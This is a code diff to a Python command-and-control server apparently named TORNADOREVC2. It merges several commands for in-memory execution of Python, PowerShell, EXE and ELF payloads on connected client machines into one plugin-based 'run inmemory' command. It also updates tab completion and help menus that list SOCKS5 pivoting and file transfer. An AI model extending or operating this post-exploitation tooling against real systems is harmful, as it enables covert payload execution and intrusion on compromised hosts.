@@ -40,7 +40,7 @@ from .constants import (
 )
 from .export import SessionExporter
 from .payloads import get_payloads
-from .payload_exec import PayloadExecutor
+from .plugins.shared.inmemory import InMemoryExecutor
 from .session_log import SessionLogger
 from .session_registry import SessionRegistry, _norm_machine_id, compute_fingerprint
 from .terminal_sanitize import strip_csi_sequences, sanitize_terminal_output
@@ -68,7 +68,7 @@ class TORNADOREVC2:
         self.current_client = None
         self.client_lock = Lock()
         self.transfer = FileTransfer(self)
-        self.payload_exec = PayloadExecutor(self)
+        self.inmemory = InMemoryExecutor(self)
         self.tunnels = TunnelManager(self)
         self.exporter = SessionExporter(self)
         self.registry = SessionRegistry()
@@ -218,11 +218,11 @@ class TORNADOREVC2:
                 return self._complete_paths(text)
             if cmd == 'download' and arg_i == 2:
                 return self._complete_paths(text)
-            if cmd in ('runpy', 'runps', 'runexe', 'runelf') and arg_i == 1:
-                return self._complete_paths(text)
             if cmd == 'run' and arg_i == 1:
                 return sorted(p for p in self.plugins.completion_plugins() if p.startswith(text.lower()))
-            if cmd == 'run' and arg_i >= 2 and words[1].lower() == 'privesccheck':
+            if cmd == 'run' and arg_i == 2 and words[1].lower() == 'inmemory':
+                return sorted(t for t in ('py', 'ps', 'exe', 'elf', 'bat', 'sh') if t.startswith(text.lower()))
+            if cmd == 'run' and arg_i == 3 and words[1].lower() == 'inmemory':
                 return self._complete_paths(text)
             if cmd == 'plugins' and arg_i == 1:
                 subs = ('list', 'load', 'unload', 'reload', 'info', 'help')
@@ -238,7 +238,9 @@ class TORNADOREVC2:
             return sorted(p for p in self.plugins.completion_plugins() if p.startswith(text.lower()))
         if cmd == 'run' and arg_i == 2:
             return sorted(i for i in self._get_client_ids() if i.startswith(text))
-        if cmd == 'run' and arg_i >= 3 and words[1].lower() == 'privesccheck':
+        if cmd == 'run' and arg_i == 3 and words[1].lower() == 'inmemory':
+            return sorted(t for t in ('py', 'ps', 'exe', 'elf', 'bat', 'sh') if t.startswith(text.lower()))
+        if cmd == 'run' and arg_i == 4 and words[1].lower() == 'inmemory':
             return self._complete_paths(text)
         if cmd == 'plugins' and arg_i == 1:
             subs = ('list', 'load', 'unload', 'reload', 'info', 'help')
@@ -248,8 +250,6 @@ class TORNADOREVC2:
         if cmd == 'upload' and arg_i == 2:
             return self._complete_paths(text)
         if cmd == 'download' and arg_i == 3:
-            return self._complete_paths(text)
-        if cmd in ('runpy', 'runps', 'runexe', 'runelf') and arg_i == 2:
             return self._complete_paths(text)
         return []
 
@@ -880,7 +880,7 @@ class TORNADOREVC2:
             print(f"{self.colors['blue']}Session log: {logger.session_dir}{self.colors['end']}")
         print(f"{self.colors['cyan']}{'='*70}{self.colors['end']}")
         print(f"{self.colors['yellow']}Ctrl+C sends interrupt; Ctrl+C twice exits to main menu{self.colors['end']}")
-        print(f"{self.colors['yellow']}Commands: sysinfo, run/runpy, plugins, export, upload/download — type 'help'{self.colors['end']}\n")
+        print(f"{self.colors['yellow']}Commands: sysinfo, run/inmemory, plugins, export, upload/download — type 'help'{self.colors['end']}\n")
         self._set_completer_mode('client')
         sys.stdout.flush()
 
@@ -915,10 +915,6 @@ class TORNADOREVC2:
                         _, mode = self._parse_sysinfo_args(cmd_parts, from_client=True)
                         self.show_sysinfo(client_sock, refresh=True, mode=mode)
                         continue
-
-                    if cmd_lower in ('runpy', 'runps', 'runexe', 'runelf'):
-                        if self.payload_exec.handle_command(client_sock, cmd_parts, from_client=True):
-                            continue
 
                     if cmd_lower in ('socks', 'tunnels'):
                         if self.tunnels.handle_command(client_sock, cmd_parts, from_client=True):
@@ -959,10 +955,8 @@ class TORNADOREVC2:
     exit(e) / quit(q) / CTRL+C               Return to the main menu
 
     {self.colors['green']}IN-MEMORY EXECUTION:{self.colors['end']}
-    runpy <local.py> [-- args] [--save-output <file>]
-    runps <local.ps1> [--save-output <file>]
-    runexe <local.exe> [-- args] [--save-output <file>]
-    runelf <local_binary> [-- args] [--save-output <file>]
+    run inmemory <filetype> <local_file> [-- args] [--save-output <file>]
+      filetype: py, ps, exe, elf, bat, sh
 
     {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
     socks <listen_port>                               SOCKS5 proxy via session
@@ -1093,21 +1087,6 @@ class TORNADOREVC2:
                         self.show_sysinfo(client_sock, refresh=True, mode=mode)
                     except ValueError:
                         print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
-                elif cmd_lower in ('runpy', 'runps', 'runexe', 'runelf'):
-                    if len(cmd_parts) < 3:
-                        print(
-                            f"{self.colors['red']}Usage: {cmd_lower} <ID> <local_file> "
-                            f"[-- args] [--save-output <file>]{self.colors['end']}"
-                        )
-                        continue
-                    try:
-                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
-                        if not client_sock:
-                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not active{self.colors['end']}")
-                            continue
-                        self.payload_exec.handle_command(client_sock, cmd_parts)
-                    except ValueError:
-                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                 elif self.exporter.handle_command(cmd_parts):
                     pass
                 elif self.plugins.handle_command(cmd_parts):
@@ -1181,10 +1160,8 @@ class TORNADOREVC2:
     socks stop <proxy_id>                                    Stop a SOCKS proxy
 
     {self.colors['green']}IN-MEMORY EXECUTION:{self.colors['end']}
-    runpy <ID> <local.py> [-- args] [--save-output <file>]
-    runps <ID> <local.ps1> [--save-output <file>]
-    runexe <ID> <local.exe> [-- args] [--save-output <file>]
-    runelf <ID> <local_binary> [-- args] [--save-output <file>]
+    run inmemory <ID> <filetype> <local_file> [-- args] [--save-output <file>]
+      filetype: py, ps, exe, elf, bat, sh
 
     {self.colors['green']}FILE TRANSFER:{self.colors['end']}
     upload [--resume] <ID> <local> <remote>     Chunked upload with SHA256 verify
